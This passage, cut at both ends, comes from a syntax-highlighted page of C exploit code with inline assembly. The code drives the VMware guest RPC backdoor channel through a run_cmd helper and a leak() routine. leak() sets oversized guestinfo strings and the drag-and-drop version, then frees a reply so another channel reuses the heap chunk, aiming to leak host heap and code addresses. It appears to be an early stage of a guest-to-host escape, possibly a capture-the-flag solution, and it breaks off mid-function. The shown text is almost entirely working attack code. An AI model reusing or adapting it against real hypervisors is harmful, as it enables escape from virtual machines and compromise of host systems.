string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0xc9435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token 